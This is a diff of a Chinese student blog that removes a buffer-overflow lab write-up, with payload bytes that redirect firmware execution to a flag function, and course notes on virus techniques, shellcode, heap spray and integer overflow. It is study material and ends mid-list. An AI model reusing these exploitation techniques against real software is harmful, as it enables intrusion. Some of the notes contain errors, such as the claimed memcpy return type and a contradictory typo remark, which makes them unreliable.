@@ -91,76 +91,12 @@
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <p>逆向分析实践：</p>
-<p>整数溢出，栈溢出改变程序跳转地址</p>
-<h2 id="理论"><a href="#理论" class="headerlink" title="理论"></a>理论</h2><ul>
-<li>通过strcpy函数返回时的溢出覆盖栈中数据</li>
-<li>当覆盖的内容，地址位置合适时可以影响寄存器的内容与程序的跳转</li>
-</ul>
-<h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><ul>
-<li><p>IDApro7.0</p>
-</li>
-<li><p>被分析的程序rev_homework.exe</p>
-</li>
-</ul>
-<h2 id="过程A"><a href="#过程A" class="headerlink" title="过程A"></a>过程A</h2><h3 id="1-分析"><a href="#1-分析" class="headerlink" title="1. 分析"></a>1. 分析</h3><p>定位到main函数：</p>
-<p><img src="/images/image-20231221200157068.png" alt="image-20231221200157068"></p>
-<p>找到输入密码的相关函数：</p>
-<p><img src="/images/image-20231221200245864.png" alt="image-20231221200245864"></p>
-<p>对于我们输入的密码，有这样的一个函数来处理：</p>
-<p>两个参数依次为字符串本身和字符串长度，如果长度在3u至8u开区间内，就会运行strcpy函数。在这一段代码中并没有关于success的痕迹，看来我们只能通过利用strcpy返回时的溢出来前往我们想要到达的地址。</p>
-<p>观察变量v3，发现[ebp-Ch]代表给它分配了12个字节的空间，如果我们的字符串超过了这个字节就有可能产生溢出，让返回值覆盖到更多的地方；同时我们要保证能通过判断条件，通过观察代码知，字符串的大小其实是判断LOBYTE()得到的，那么我们构造超过255字节的数据就行了，超过的部分在3到8字节。</p>
-<p><img src="/images/image-20231221200330676.png" alt="image-20231221200330676"></p>
-<p>找一下目的地址在哪里，搜索相关字符串：</p>
-<p><img src="/images/image-20231221201118436.png" alt="image-20231221201118436"></p>
-<p>找到对应函数的地址是004011A0：</p>
-<p><img src="/images/image-20231221201218883.png" alt="image-20231221201218883"></p>
-<h3 id="2-调试"><a href="#2-调试" class="headerlink" title="2. 调试"></a>2. 调试</h3><p>在strcpy处下断点：</p>
-<p><img src="/images/image-20231221201401199.png" alt="image-20231221201401199"></p>
-<p>在调试中我们观察EBP地址处的栈得以验证，我们的字符串要被覆盖到0019FC44这一处地址，并且配有12字节的空间，而我们要通过溢出对0019FC54地址处覆盖，因为这是EBP即将使用的地址，它依据这里的内容进行跳转。</p>
-<p><img src="/images/image-20231221201604656.png" alt="image-20231221201604656"></p>
-<p>构造相应的二进制文件，把对应字节处写上目标地址，即可实现目标：</p>
-<p><img src="/images/image-20231221202051307.png" alt="image-20231221202051307"></p>
-<h3 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h3><p>成功跳转到success：</p>
-<p><img src="/images/image-20231221195527182.png" alt="image-20231221195527182"></p>
-<h2 id="过程B"><a href="#过程B" class="headerlink" title="过程B"></a>过程B</h2><p>这一次分析物联网设备程序</p>
-<p>定位main函数如下：main函数主要做这几件事情</p>
-<ul>
-<li>让你输入学号后四位，存储到id，打印你输入的学号</li>
-<li>让你输入串的长度，存储到length</li>
-<li>循环读入你输入的字符串，把HEX value转化成数字，存储到v4，InputBuffer数组中</li>
-<li>调用StartFreeRTOS函数，，调用vTask函数，传入了id</li>
-</ul>
-<p><img src="/images/image-20231225195904251.png" alt="image-20231225195904251"></p>
-<p>翻找一通，StartFreeRTOS是涉及硬件任务以及权限的函数，实际处理的函数应该在vTask中，在vTask中的某一个循环内找到了这样的函数Helper：</p>
-<p>这个HelperBuffer被分配了16个字节的空间，而我们的InputBuffer被逐一复项复制到HelperBuffer中，这里应该就是溢出点了，初步思考，我们需要构造一个长串，在第17和20字节写入我们要跳转的地址</p>
-<p><img src="/images/image-20231228195524359.png" alt="image-20231228195524359"></p>
-<p>然而试了一下程序直接卡死，到底是哪里出问题了呢？原来这次实验跟之前之前那次有点不一样，很令人疑惑的是，HelpBuffer明明存储12个整型元素，但是被分配了16字节的空间，点进这个变量一看，发现他的堆栈结构如下，也就是说，我们传入16个字节就已经发生溢出了，13至16个字节的位置正好会覆盖栈中EIP的返回位置</p>
-<p><img src="/images/image-20231228212757755.png" alt="image-20231228212757755"></p>
-<p>找一下成功的输出代码在哪里，这样我们可以知道覆盖的目标，它的地址位于00009F94，由于固件特殊性，实际上地址要加1也就是00009F95：</p>
-<p><img src="/images/image-20231225203023221.png" alt="image-20231225203023221"></p>
-<p>用qemu测试一下：</p>
-<p>安装：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">wget https://download.qemu.org/qemu-7.0.0.tar.xz</span><br><span class="line">tar xvJf qemu-7.0.0.tar.xz</span><br><span class="line"><span class="built_in">cd</span> qemu-7.0.0</span><br><span class="line">sudo apt-get install ninja-build -y <span class="comment"># ninja</span></span><br><span class="line">sudo apt install libglib2.0-dev -y <span class="comment"># glib-2.56 gthread-2.0</span></span><br><span class="line">sudo apt install libpixman-1-dev -y <span class="comment"># pixman-1</span></span><br><span class="line">./configure --prefix=~/qemu-7.0.0/build --target-list=arm-softmmu --enable-debug</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>
-
-<p>运行：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> qemu-7.0.0/build</span><br><span class="line">./qemu-system-arm -M mps2-an386 -cpu cortex-m4 -m 16M -nographic -d in_asm,nochain -kernel ~/Task1_23.axf -D log.txt</span><br></pre></td></tr></table></figure>
-
-<p>成功通过：</p>
-<p><img src="/images/image-20231228212722198.png" alt="image-20231228212722198"></p>
-<h2 id="过程C"><a href="#过程C" class="headerlink" title="过程C"></a>过程C</h2><p>这次是多次跳转，不能直接跳转到flag函数，而是要先利用一些系统函数提升权限</p>
-<p>先观察一下处理输入的函数：这个和任务一单次跳转是一样的，HelpBuffer还是存储了12个整形但是分配了16字节的空间，第13个字节开始的内容会被覆盖到EIP中去。需要注意的是，下面有一个操作把所有的输入都减去1了，所以最后构造的时候记得要加1</p>
-<p><img src="/images/image-20240120133138777.png" alt="image-20240120133138777"></p>
-<p>接着寻找一下SVC中断提权函数，发现它在这个地址0x86EC，我们等一下要利用POP     {xRunningPrivileged,PC}语句来提升权限完成二次跳转，把这个地址加1，也就是0x86ED，也就是说要构造如下数据：1 1 1 1 1 1 1 1 1 1 1 1 EE 87 1 1 </p>
-<p><img src="/images/image-20240120133521518.png" alt="image-20240120133521518"></p>
-<p>接着搜索字符串找到打印flag的函数，准备构造第二份字符串，如下：在这个地址0x1C7E，按照对应的规则，我们希望执行完pop语句后EIP的值能够是打印函数的地址，我们应该构造如下的数据：1 1 1 1 80 1D 1 1</p>
-<p><img src="/images/image-20240120134041656.png" alt="image-20240120134041656"></p>
-<p>1 1 1 1 1 1 1 1 1 1 1 1 EE 87 1 1 1 1 1 1 80 1D 1 1，总长度16+8&#x3D;24，把这个shellcode输入程序运行：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> qemu-7.0.0/build</span><br><span class="line">./qemu-system-arm -M mps2-an386 -cpu cortex-m4 -m 16M -nographic -d in_asm,nochain -kernel ~/Task2_23.axf -D log.txt</span><br></pre></td></tr></table></figure>
-
-<p>成功通过：</p>
-<p><img src="/images/image-20240120141641711.png" alt="image-20240120141641711"></p>
-
+        <p>逆向分析实践，实验记录</p>
+        
+          <p class="article-more-link">
+            <a href="/2024/04/15/Reverse/#more">Read More</a>
+          </p>
+        
       
     </div>
     <footer class="article-footer">
@@ -200,258 +136,12 @@
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <h1 id="1"><a href="#1" class="headerlink" title="1"></a>1</h1><p>为什么软件测试无法保证软件的安全性：</p>
-<p>软件缺陷和错误：</p>
-<h1 id="2"><a href="#2" class="headerlink" title="2"></a>2</h1><p>windwos虚拟地址空间：二级页表</p>
-<p>CPU通过二级页表将虚拟地址转化为物理地址的过程通常涉及以下步骤：</p>
-<ol>
-<li><strong>虚拟地址生成：</strong> 当程序运行时，CPU产生虚拟地址。这个虚拟地址由两部分组成：高位部分是页表项的索引，低位部分是页内偏移。</li>
-<li><strong>页表查找：</strong> CPU使用虚拟地址的高位部分作为索引，查找一级页表。这个一级页表中的页表项包含了指向二级页表的物理地址。</li>
-<li><strong>二级页表查找：</strong> CPU使用虚拟地址的低位部分作为索引，查找二级页表。这个二级页表中的页表项包含了指向实际物理页面的物理地址。</li>
-<li><strong>物理地址生成：</strong> CPU将从二级页表中获取到的物理地址与虚拟地址的低位部分（页内偏移）合并，得到最终的物理地址。</li>
-</ol>
-<p>删除文件后可以恢复：没有真的删除数据，只是删除了索引等</p>
-<hr>
-<p>PE文件结构：PE文件的结构包含以下几个主要部分：</p>
-<ol>
-<li>DOS头（DOS Header）：这部分包含了DOS可执行文件的头部信息，以便支持在DOS环境下运行。这是为了兼容早期的DOS系统。</li>
-<li>PE签名（PE Signature）：标志着文件的开始，紧接在DOS头之后，它包含一个标识PE文件的签名。</li>
-<li>COFF头（COFF Header）：COFF（Common Object File Format）头部包含了PE文件的基本信息，如节表的位置和大小、入口点地址等。</li>
-<li>节表（Section Table）：节表描述了PE文件的各个节（Sections），每个节包含特定类型的数据，例如代码、数据、资源等。节表中记录了每个节的起始位置、大小、属性等信息。</li>
-<li>数据目录表（Data Directory Table）：这个表包含了指向各种重要数据结构的指针，比如导入表、导出表、异常处理表等。这些数据结构存储了程序执行和运行时所需的关键信息。</li>
-<li>导入表（Import Table）：导入表记录了程序运行时需要引用的外部函数和库，以便在运行时解析并加载这些外部依赖。</li>
-<li>导出表（Export Table）：导出表包含了程序内部对外提供的函数和数据，允许其他程序调用这些功能。</li>
-<li>重定位表（Relocation Table）：当PE文件加载到内存时，可能会发生地址重定位，重定位表记录了需要进行重定位的位置和相应的修正信息。</li>
-</ol>
-<p>总体而言，PE文件的结构设计得相对灵活，以适应各种类型的可执行文件和动态链接库。这种结构使得Windows操作系统能够有效地加载和执行PE文件中的程序。</p>
-<hr>
-<p>PE文件与内存之间的映射：</p>
-<h1 id="3"><a href="#3" class="headerlink" title="3"></a>3</h1><p>蠕虫和计算机病毒：</p>
-<ul>
-<li>病毒应具备文件感染性，一般需要宿主程序激活恶意代码</li>
-<li>蠕虫应具备无用出发能够自动完成感染传播的特性</li>
-</ul>
-<p>后门和木马：</p>
-<ul>
-<li>木马强调伪装性质，诱导用户进行安装，并且完成远程控制监视等工作</li>
-<li>后门指的是程序中藏有的恶意功能，漏洞等</li>
-</ul>
-<h1 id="4"><a href="#4" class="headerlink" title="4"></a>4</h1><p>仅作了解</p>
-<h1 id="5"><a href="#5" class="headerlink" title="5"></a>5</h1><p>关键技术：</p>
-<ul>
-<li>重定位</li>
-<li>API函数获取</li>
-<li>目标检索</li>
-<li>感染</li>
-</ul>
-<p>API重定位技术：常见的重定位代码，巧妙使用了delta这一个标签来定位相对偏移量，并且将值存放在ebx中。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Relocate	proc</span><br><span class="line">	call	delta</span><br><span class="line">delta:</span><br><span class="line">	pop	ebx</span><br><span class="line">	sub	ebx,offset delta</span><br><span class="line">	ret</span><br><span class="line">Relocate	endp</span><br></pre></td></tr></table></figure>
-
-<p>定位Kernal32.dll模块地址：搜索PE文件结构头，通过SEH异常处理机制获取，通过PEB进程控制块数据结构获取。以下代码通过调用<code>Relocate</code>函数，然后遍历内存空间，搜索<code>kernel32.dll</code>模块的DOS和NT签名，最终返回<code>kernel32.dll</code>的基地址。如果在搜索过程中发生错误（比如签名不匹配），则会调整搜索位置并继续搜索。这是一种通用的模块基地址定位方法。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">GetKernelBase proc dwKernelRet</span><br><span class="line">    LOCAL dwReturn</span><br><span class="line"></span><br><span class="line">    ; 调用Relocate函数</span><br><span class="line">    pushad</span><br><span class="line">    call Relocate</span><br><span class="line"></span><br><span class="line">    ; 切换到fs段，利用SEH</span><br><span class="line">    assume fs:nothing</span><br><span class="line">    push ebp</span><br><span class="line">    lea eax, [ebx + offset PageError]</span><br><span class="line">    push eax</span><br><span class="line">    lea eax, [ebx + offset SEHHandler]</span><br><span class="line">    push eax</span><br><span class="line">    push fs:[0]</span><br><span class="line">    mov fs:[0], esp</span><br><span class="line"></span><br><span class="line">    ; 初始化寄存器</span><br><span class="line">    mov edi, dwKernelRet</span><br><span class="line">    and edi, 0FFFF0000h ; 将edi寄存器的低16位清零，保留其高16位</span><br><span class="line"></span><br><span class="line">@@:</span><br><span class="line">    ; 检查模块的DOS签名</span><br><span class="line">    cmp word ptr [edi], IMAGE_DOS_SIGNATURE</span><br><span class="line">    jne PageError</span><br><span class="line"></span><br><span class="line">    ; 获取PE头地址</span><br><span class="line">    mov esi, edi</span><br><span class="line">    add esi, [esi + 003Ch]</span><br><span class="line"></span><br><span class="line">    ; 检查模块的NT签名</span><br><span class="line">    cmp word ptr [esi], IMAGE_NT_SIGNATURE</span><br><span class="line">    jne PageError</span><br><span class="line"></span><br><span class="line">    ; 如果模块符合要求，设置dwReturn为模块基地址</span><br><span class="line">    mov dwReturn, edi</span><br><span class="line">    jmp @f</span><br><span class="line"></span><br><span class="line">PageError:</span><br><span class="line">    ; 调整edi寄存器，继续搜索</span><br><span class="line">    sub edi, 010000h</span><br><span class="line">    cmp edi, 070000000h</span><br><span class="line">    jb @f</span><br><span class="line">    jmp @b</span><br><span class="line"></span><br><span class="line">@@:</span><br><span class="line">    ; 恢复fs段</span><br><span class="line">    pop fs:[0]</span><br><span class="line">    add esp, 0Ch</span><br><span class="line">    popad</span><br><span class="line"></span><br><span class="line">    ; 返回模块基地址</span><br><span class="line">    mov eax, dwReturn</span><br><span class="line">    ret</span><br><span class="line"></span><br><span class="line">GetKernelBase endp</span><br></pre></td></tr></table></figure>
-
-<p>文件感染：调用相关API函数进行文件的搜索与感染，检查条件，遍历……</p>
-<p>捆绑释放感染：将HOST作为数据存储在病毒体内，执行病毒程序时，还原并执行HOST文件。优点是编写简单高效，缺点是被感染后程序的主体是病毒文件，隐蔽性差。</p>
-<h1 id="6"><a href="#6" class="headerlink" title="6"></a>6</h1><p>宏病毒如何获得控制权：感染文档的通用模板，执行恶意功能</p>
-<p>宏病毒代码主要部分：自我保护（伪装），感染代码导出，感染代码导入</p>
-<p>脚本病毒感染文件的方法：自我复制，附加在同类程序上都能执行的特点</p>
-<p>脚本病毒对抗反病毒软件的技巧：自加密，巧妙使用敏感函数（用Execute函数），改变某些对象的声明方法，直接关闭反病毒软件。</p>
-<h1 id="7"><a href="#7" class="headerlink" title="7"></a>7</h1><p>仅作了解</p>
-<h1 id="8"><a href="#8" class="headerlink" title="8"></a>8</h1><p>仅作了解</p>
-<h1 id="9"><a href="#9" class="headerlink" title="9"></a>9</h1><p>特征值检测：详见算法笔记文件夹中的模式匹配</p>
-<p>校验和检测：</p>
-<h1 id="10"><a href="#10" class="headerlink" title="10"></a>10</h1><h2 id="漏洞引入"><a href="#漏洞引入" class="headerlink" title="漏洞引入"></a>漏洞引入</h2><p>漏洞定义：</p>
-<p>按威胁分类：</p>
-<p>漏洞生命周期：</p>
-<p>对软件系统的威胁：</p>
-<h2 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h2><h3 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h3><p>栈相关知识：</p>
-<ul>
-<li>先入后出，使用pop和push命令控制</li>
-<li>高地址向低地址生长，也就是说高地址是栈底</li>
-<li>ESP指向栈顶，EBP指向栈底<ul>
-<li>SP是栈顶指针</li>
-<li>BP是基地址指针，表示栈中相对稳定的位置</li>
-<li>IP是指令寄存器</li>
-</ul>
-</li>
-</ul>
-<p>当某个函数的栈帧被压入栈时，其中就包含着当前的IP值，即函数调用返回后下一个语句的执行地址。</p>
-<p>函数执行过程：</p>
-<ul>
-<li>把函数所需要的参数压入栈</li>
-<li>保存指令寄存器中的内容，作为返回地址放入堆栈当前的基址寄存器</li>
-<li>把当前的栈指针(ESP)拷贝到基址寄存器作为新的基地址</li>
-<li>为本地变量留出一定空间，把ESP减去适当的数值</li>
-</ul>
-<p><img src="/images/image-20240115204318858.png" alt="image-20240115204318858"></p>
-<h3 id="利用：shellcode"><a href="#利用：shellcode" class="headerlink" title="利用：shellcode"></a>利用：shellcode</h3><h4 id="jmp-esp"><a href="#jmp-esp" class="headerlink" title="jmp esp"></a>jmp esp</h4><ol>
-<li><strong>初始状态：</strong><ul>
-<li>程序执行到一个函数的返回点，即将执行 <code>ret</code> 指令。</li>
-<li>栈上存放了原始的返回地址，指向程序正常执行的下一个指令。</li>
-</ul>
-</li>
-<li><strong>栈布局：</strong><ul>
-<li>在输入中溢出缓冲区，覆盖函数的返回地址为攻击者预先准备的地址。</li>
-<li>这个地址是存放着 <code>jmp esp</code> 指令的位置。</li>
-</ul>
-</li>
-<li><strong><code>jmp esp</code> 指令执行：</strong><ul>
-<li><code>ret</code> 指令被执行，从栈上弹出了攻击者提供的地址，即 <code>jmp esp</code> 指令的地址。</li>
-<li>控制流跳转到了 <code>jmp esp</code> 指令所在的位置，即栈上的某个地址。</li>
-</ul>
-</li>
-<li><strong>执行 shellcode：</strong><ul>
-<li>ESP 寄存器此时指向了栈顶，而栈顶上存放着 <code>jmp esp</code> 指令的地址。</li>
-<li><code>jmp esp</code> 指令执行后，控制流跳转到了这个地址，即栈上的某个位置。</li>
-<li>在这个位置通常存放着攻击者精心构造的 shellcode。</li>
-<li>程序开始执行 shellcode，实现攻击者的恶意目的。</li>
-</ul>
-</li>
-</ol>
-<h4 id="SEH链"><a href="#SEH链" class="headerlink" title="SEH链"></a>SEH链</h4><ul>
-<li>SEH为结构化异常处理</li>
-<li>SEH结构一般在栈空间附近，溢出可以覆盖到</li>
-</ul>
-<p>异常处理句柄赋值为类似jmp esp的语句，指向shell code</p>
-<h3 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h3><p><img src="/images/91500f3fe5c0e448eca4729a724a78f7.png" alt="91500f3fe5c0e448eca4729a724a78f7"></p>
-<p>50个数据之后的数据会溢出，覆盖p（指针变量，4字节）、覆盖EBP（四字节），然后就是覆盖EIP（四字节），一个字节一个字符，存到eip正好是ccdd，小端存储则为地址0x64646363。注意：如果题目有说明，可能需要考虑内存对齐，比如<code>sizeof(s1)%4==0</code>，这既是说，写下<code>char s1[50]</code>，其实会分配52字节的空间，那么答案就不是ccdd而是ddee。</p>
-<h2 id="堆"><a href="#堆" class="headerlink" title="堆"></a>堆</h2><h3 id="基础-1"><a href="#基础-1" class="headerlink" title="基础"></a>基础</h3><p>堆用于存放程序运行中，请求操作系统分配给自己的内存段，每一个进程有自己的堆。</p>
-<ul>
-<li>大小不固定</li>
-<li>内存不一定连续</li>
-<li>操作系统可能采用链表管理</li>
-<li>提供进程生命周期存放数据的区域</li>
-</ul>
-<p>堆结构：</p>
-<ul>
-<li><p>堆表、</p>
-<ul>
-<li><p>空表，用于标识空闲块，结构如下：</p>
-<ul>
-<li>空表则是指未分配的内存块链表。当程序释放一块内存时，这块内存会被添加到空表中，以便下次程序需要分配内存时可以从空表中选择一块合适的内存块分配给程序使用。</li>
-</ul>
-</li>
-<li><p>快表，记录堆结构的状态，用于分配内存空间：</p>
-<ul>
-<li>在堆表中，快表通常指的是一组小型的、固定大小的内存块链表，用于快速分配和释放小块内存。这些块的大小一般是固定的，这样可以提高内存分配和释放的效率。快表中的内存块通常是由一些常用的大小组成，以加速分配和释放操作。</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p>堆块：块首，块身</p>
-<ul>
-<li><strong>块大小信息：</strong> 记录了当前内存块的大小，以便系统知道这个块能够存储多少数据。</li>
-<li><strong>块状态信息：</strong> 用于标识当前内存块的状态，是已分配还是未分配。</li>
-<li><strong>前向指针和后向指针：</strong> 这两个指针通常存在于空闲的堆块中，用于构成一个链表，将空闲的堆块串联在一起，以便更快速地进行内存的分配和释放。前向指针指向链表中下一个空闲块，后向指针指向链表中上一个空闲块。这样，当程序需要分配内存时，可以在这个链表中找到一个足够大的未分配块，而当程序释放内存时，可以将这个块添加到链表中。</li>
-<li><strong>数据区：</strong> 存储实际的用户数据，这是程序通过内存分配所获得的可用空间。</li>
-</ul>
-</li>
-</ul>
-<p>在已占用的堆块中，通常不需要前向和后向指针。已分配的堆块的元数据通常由分配器进行管理，这些信息存储在堆块之前或之后的某个位置，以便程序能够正确地进行内存释放。分配器会追踪已分配的块的大小和状态，因此不需要链表来管理已占用的块。</p>
-<h3 id="堆溢出利用，喷射"><a href="#堆溢出利用，喷射" class="headerlink" title="堆溢出利用，喷射"></a>堆溢出利用，喷射</h3><h4 id="堆溢出"><a href="#堆溢出" class="headerlink" title="堆溢出"></a>堆溢出</h4><p>如果我们在分配完buf1后往里面赋值，溢出覆盖掉两个指针，下一次分配buf2时如果没有释放buf1，那么就会把4字节的内容写入到一个地址当中，而这个内容和这个地址都是可以控制的。</p>
-<p><img src="/images/image-20240116170253229.png" alt="image-20240116170253229"></p>
-<h4 id="Heap-spray"><a href="#Heap-spray" class="headerlink" title="Heap spray"></a>Heap spray</h4><ul>
-<li>向堆中注入大量数据，使得数据填满特定内存地址空间，当栈溢出时可以引导EIP到堆的空间。</li>
-<li>injected data &#x3D; slide code + shell code</li>
-</ul>
-<p>思想：用相同的指令去覆盖大量地址，在每一块分配到的内存最后都加上shellcode。这个指令的要求是，相当于NOP指令，并且该指令指向的地址正好就落在覆盖的这片大内存地址中。比如使用0x0c0c0c0c（OR AL,0C）进行覆盖，只要eip指向了这个指令，就会一直执行下去直到shellcode。</p>
-<h4 id="UAF，野指针"><a href="#UAF，野指针" class="headerlink" title="UAF，野指针"></a>UAF，野指针</h4><p>如果攻击者可以操纵p1，则在p1指向的内存被释放后，程序再次申请内存，由于p1没有被赋值为NULL，攻击者可向p1指向的内存 写入精心构造的Shellcode或采用其他方式改变程序控制流。</p>
-<h4 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;AAAA%08x. %08x. %08x. %08x. %08x. %08x. %08x. %08x. %08x. %08x. %08x. %08x. %08x. %08x.&quot;</span>, ...);</span><br></pre></td></tr></table></figure>
-
-<p>这个格式化字符串包含了多个<code>%08x</code>，表示以16进制输出的整数，并且宽度为8个字符，左侧用0填充。然而，在实际参数列表中并没有相应数量的参数。如果没有正确匹配的参数，<code>printf()</code>会在堆栈中寻找额外的参数，导致读取或写入到未知内存位置。</p>
-<h2 id="整数溢出"><a href="#整数溢出" class="headerlink" title="整数溢出"></a>整数溢出</h2><p>定义：字面意思，好好理解。</p>
-<h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p><strong>宽度溢出</strong>，代码中，存在整数溢出的潜在问题。让我们来分析一下：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> s;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">80</span>];</span><br><span class="line">    i = atoi(argv[<span class="number">1</span>]);</span><br><span class="line">    s = i;</span><br><span class="line">    <span class="keyword">if</span> (s &gt;= <span class="number">80</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    <span class="built_in">memcpy</span>(buf, argv[<span class="number">2</span>], i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>潜在问题点：</p>
-<ol>
-<li><strong>atoi的使用：</strong> <code>atoi</code> 函数将字符串转换为整数。如果用户提供的 <code>argv[1]</code> 中的字符串不能被合理转换为整数，<code>atoi</code> 将返回零。这可能导致 <code>i</code> 的值为零，而在后续的代码中可能会引发问题。建议使用更安全的转换函数，如 <code>strtol</code>，并检查转换是否成功。</li>
-<li><strong>unsigned short 转换：</strong> <code>int</code> 类型的值被赋值给 <code>unsigned short</code> 类型的变量 <code>s</code>，这可能导致整数截断。如果 <code>i</code> 的值大于 <code>USHRT_MAX</code>（<code>unsigned short</code> 类型的最大值），则 <code>s</code> 将溢出。应该确保在进行类型转换之前检查 <code>i</code> 的值是否在合理的范围内。</li>
-<li><strong>memcpy 长度检查不足：</strong> 对于 <code>memcpy</code> 的调用，目标缓冲区是 <code>buf</code>，而复制的长度是 <code>i</code>。如果 <code>i</code> 大于等于 80，将超出 <code>buf</code> 的范围，导致缓冲区溢出。应该确保复制的长度不超过目标缓冲区的大小。</li>
-</ol>
-<hr>
-<p><strong>运算溢出</strong>，代码中，有一处可能导致整数溢出的潜在问题。让我们来分析一下：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">CopyIntArray</span><span class="params">(<span class="type">int</span> *<span class="built_in">array</span>, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="type">int</span> *myarray;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    myarray = <span class="built_in">malloc</span>(len * <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    <span class="keyword">if</span> (myarray == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i++)</span><br><span class="line">        myarray[i] = <span class="built_in">array</span>[i]; <span class="comment">// 拼写错误，应该是 array[i]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>潜在问题点：</p>
-<ol>
-<li><strong>拼写错误：</strong> 在 <code>myarray[i] = arrary[i];</code> 中，<code>arrary</code> 是一个拼写错误，应该是 <code>array</code>。这可能导致未定义行为或程序错误，因为 <code>arrary</code> 并没有被定义。</li>
-<li><strong>整数溢出：</strong> 在 <code>malloc(len * sizeof(int));</code> 中，<code>len * sizeof(int)</code> 可能导致整数溢出，特别是当 <code>len</code> 是一个很大的正整数时。这是因为 <code>len * sizeof(int)</code> 的结果可能超过 <code>int</code> 类型所能表示的最大值。</li>
-</ol>
-<hr>
-<p><strong>符号溢出</strong>，代码中，存在一个潜在的整数溢出问题。让我们来分析一下：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">char</span> data[<span class="number">256</span>]; </span><br><span class="line"><span class="type">int</span> <span class="title function_">store_data</span><span class="params">(<span class="type">char</span> *buf, <span class="type">int</span> len)</span></span><br><span class="line">&#123; </span><br><span class="line">    <span class="keyword">if</span>(len &gt; <span class="number">256</span>) </span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>; </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">memcpy</span>(data, buf, len); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>潜在问题点：</p>
-<ol>
-<li><strong>返回值类型不匹配：</strong> <code>memcpy</code> 函数返回一个指向目标缓冲区的指针，而 <code>store_data</code> 函数声明的返回类型是 <code>int</code>。这会导致类型不匹配，可能引起问题。建议使用 <code>size_t</code> 类型，这是 <code>memcpy</code> 函数返回的类型，以适应实际的返回值。</li>
